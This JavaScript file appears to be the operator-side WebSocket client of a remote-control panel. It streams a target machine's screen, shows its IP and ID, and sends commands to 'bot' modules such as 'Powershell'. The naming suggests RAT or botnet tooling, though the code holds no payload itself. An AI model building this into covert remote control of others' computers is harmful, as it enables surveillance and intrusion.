// frontend/client_control/js/modules/websocket/connection.js

import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
const $ = id => document.getElementById(id);

const ui = (id, val) => { if ($(id)) $(id).textContent = val ?? '...'; };

const setOnline = (on) => {
    const el = $('status-indicator');
    el?.classList.toggle('online', on);
    el?.classList.toggle('offline', !on);
    ui('status-text', on ? 'online' : 'offline');
};

const handleIncomingData = (buf) => {
    const pkg = decodePacket(buf);
    if (!pkg) return;

    const { module, type, action, payload } = pkg;

    if (module === 'ScreenView') {
        if (action === 'STOP') return window.resetRenderer?.();
        if (type === 'bin') return renderScreenRGBA(payload);
        return;
    }

    if (module === 'SystemInfo') {
        const data = payload;
        if (data && typeof data === 'object') {
            if (data.ip) ui('display-ip', data.ip);
            if (data.id) ui('display-id', data.id);
            // Синхронизация статуса бота (online/offline) из БД сервера
            if (data.status) window.updateBotStatus?.(data.status);
        }
        return;
    }

    window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: payload }));
};

export const initControlConnection = () => {
    const { clientId: tid } = AppState;
    const [token, login] = ['auth_token', 'user_login'].map(k => localStorage.getItem(k));
    
    if (!token || !tid) return console.error("[WS] Missing Auth");

    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${protocol}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(tid)}`;
    
    socket = new WebSocket(url);
    socket.binaryType = 'arraybuffer';
    
    socket.onopen = () => setOnline(true);
    socket.onclose = () => setOnline(false);
    socket.onmessage = (e) => handleIncomingData(e.data);

    window.sendToBot = (modName, pay, action = 'none', extra = 'none') => {
        if (socket?.readyState !== 1) return;

        // Определяем тип для заголовка пакета
        let type = 'str';
        if (pay instanceof ArrayBuffer || pay instanceof Uint8Array) type = 'bin';
        else if (typeof pay === 'object') type = 'json';
        else if (typeof pay === 'number') type = 'int';

        // modName у нас теперь приходит просто как имя модуля, например "Powershell"
        // Формируем пакет согласно формуле V8.0
        socket.send(encodePacket(tid, modName, type, action, extra, pay));
    };
};